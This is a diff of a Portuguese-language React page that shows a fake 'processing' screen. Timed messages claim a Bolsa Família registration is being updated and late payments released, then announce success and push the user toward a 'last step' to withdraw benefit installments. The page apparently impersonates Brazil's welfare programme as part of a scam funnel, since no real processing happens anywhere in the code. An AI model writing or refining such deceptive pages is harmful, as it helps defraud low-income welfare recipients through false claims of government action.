@@ -1,135 +1,77 @@
 import { useEffect, useState } from 'react';
 import { useLocation } from 'wouter';
-import { Loader2, CheckCircle } from 'lucide-react';
 import { useUserStore } from '../store/userStore';
 
 export default function Processando() {
   const [, navigate] = useLocation();
   const { userData } = useUserStore();
-  const [statusIndex, setStatusIndex] = useState(0);
-  const [showConcluido, setShowConcluido] = useState(false);
-  const [showCheck, setShowCheck] = useState(false);
-
-  // Lista de status que serão exibidos em sequência
-  const statusMessages = [
-    "Verificando informações...",
-    "Validando dados no sistema...",
-    "Atualizando cadastro no Bolsa Família...",
-    "Calculando novas parcelas...",
-    "Liberando pagamentos atrasados...",
-    "Finalizando processo..."
-  ];
-
+  
+  // Estado para controlar se já terminou de processar
+  const [processCompleted, setProcessCompleted] = useState(false);
+  
+  // Obter apenas o primeiro nome
+  const primeiroNome = userData.nome.split(' ')[0];
+  
   useEffect(() => {
-    // Avançar para o próximo status a cada 3 segundos
-    if (statusIndex < statusMessages.length) {
-      const timer = setTimeout(() => {
-        setStatusIndex(statusIndex + 1);
-      }, 3000);
-      
-      return () => clearTimeout(timer);
-    } else {
-      // Quando todos os status forem exibidos, mostrar a mensagem de conclusão
-      const timer = setTimeout(() => {
-        setShowConcluido(true);
-        
-        // Mostrar o ícone de check após um breve delay
-        setTimeout(() => {
-          setShowCheck(true);
-        }, 500);
-      }, 1000);
-      
-      return () => clearTimeout(timer);
-    }
-  }, [statusIndex, statusMessages.length]);
-
-  const handleContinuarClick = () => {
+    // Após 3 segundos, mostrar a tela de conclusão
+    const timer = setTimeout(() => {
+      setProcessCompleted(true);
+    }, 3000);
+    
+    return () => clearTimeout(timer);
+  }, []);
+  
+  const handleContinuar = () => {
     navigate('/sucesso');
   };
 
-  // Cálculo da porcentagem de progresso
-  const progressPercent = Math.min(
-    statusIndex === statusMessages.length
-      ? 100
-      : Math.floor((statusIndex / statusMessages.length) * 100),
-    100
-  );
-
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      {/* Cabeçalho com gradiente azul */}
-      <div className="relative">
-        <header className="bg-gradient-to-r from-[#0066b3] to-[#03a9f4] text-white p-4 flex items-center justify-center">
-          <span className="text-lg font-medium">Processando</span>
-        </header>
-        {/* Barra inferior */}
-        <div className="h-1 bg-white w-full absolute bottom-0 opacity-20"></div>
+      {/* Cabeçalho azul */}
+      <div className="bg-[#0066b3] text-white p-4 flex items-center justify-center">
+        <span className="text-lg font-medium">Processando</span>
       </div>
 
-      <div className="flex-1 flex flex-col justify-center items-center p-8">
-        {!showConcluido ? (
-          <>
-            {/* Spinner de carregamento */}
-            <div className="mb-8 relative">
-              <Loader2 className="h-20 w-20 text-[#0066b3] animate-spin" />
-              
-              {/* Porcentagem no centro do spinner */}
-              <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-[#0066b3] font-bold text-sm">
-                {progressPercent}%
+      <div className="flex-1 flex flex-col justify-center items-center p-6">
+        {!processCompleted ? (
+          <div className="flex flex-col items-center justify-center">
+            {/* Animação de carregamento */}
+            <div className="w-16 h-16 border-t-4 border-b-4 border-blue-500 rounded-full animate-spin mb-8"></div>
+            <p className="text-lg text-gray-700">Atualizando seu cadastro...</p>
+          </div>
+        ) : (
+          <div className="max-w-sm w-full text-center animate-fadeIn">
+            {/* Ícone de sucesso */}
+            <div className="flex justify-center mb-8">
+              <div className="w-24 h-24 text-green-500">
+                <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <circle cx="50" cy="50" r="45" stroke="currentColor" strokeWidth="8" />
+                  <path d="M30 50L45 65L70 35" stroke="currentColor" strokeWidth="8" strokeLinecap="round" strokeLinejoin="round" />
+                </svg>
               </div>
             </div>
             
             {/* Título */}
-            <h2 className="text-xl font-bold text-[#0066b3] mb-6 text-center">
-              Aguarde alguns instantes...
-            </h2>
-            
-            {/* Mensagem de status atual */}
-            <div className="text-center text-gray-700 mb-8 h-10 flex items-center justify-center">
-              <p className="animate-fadeIn">{statusMessages[statusIndex] || "Finalizando..."}</p>
-            </div>
-            
-            {/* Barra de progresso */}
-            <div className="w-full max-w-md bg-gray-200 rounded-full h-4 overflow-hidden">
-              <div 
-                className="bg-[#0066b3] h-full transition-all duration-500 ease-out"
-                style={{ width: `${progressPercent}%` }}
-              ></div>
-            </div>
-            
-            {/* Texto do progresso */}
-            <p className="mt-3 text-sm text-gray-500">
-              O sistema está atualizando seu cadastro...
-            </p>
-          </>
-        ) : (
-          <>
-            {/* Ícone de conclusão */}
-            <div className={`mb-8 transform transition-all duration-500 ${showCheck ? 'scale-100' : 'scale-0'}`}>
-              <CheckCircle className="h-20 w-20 text-green-500" />
-            </div>
-            
-            {/* Título */}
-            <h2 className="text-xl font-bold text-green-600 mb-8 text-center animate-fadeIn">
+            <h1 className="text-2xl font-bold text-green-500 mb-8">
               Cadastro atualizado com sucesso!
-            </h2>
+            </h1>
             
-            {/* Informação do usuário */}
-            <div className="bg-[#f1f9ff] p-4 rounded-lg mb-8 w-full max-w-md">
-              <p className="text-center text-gray-700">
-                <span className="font-semibold">{userData.nome}</span>, seus dados foram atualizados 
-                e as parcelas do Bolsa Família serão disponibilizadas em breve.
+            {/* Mensagem */}
+            <div className="bg-[#f1f9ff] p-4 rounded-lg mb-8">
+              <p className="text-gray-700">
+                <span className="font-medium">{primeiroNome}</span>, resta apenas uma <span className="font-bold text-red-600">ÚLTIMA ETAPA</span> para sacar suas <span className="font-bold text-red-600">PARCELAS DO BOLSA FAMÍLIA</span>!
               </p>
             </div>
             
-            {/* Botão de continuar */}
+            {/* Botão continuar */}
             <button
-              onClick={handleContinuarClick}
-              className="w-full max-w-md py-4 bg-[#ee8435] text-white font-medium rounded-md hover:bg-[#df7426] uppercase"
+              type="button"
+              className="w-full py-4 bg-[#ee8435] text-white font-medium rounded-md hover:bg-[#df7426] uppercase"
+              onClick={handleContinuar}
             >
-              Continuar
+              CONTINUAR
             </button>
-          </>
+          </div>
         )}
       </div>
     </div>
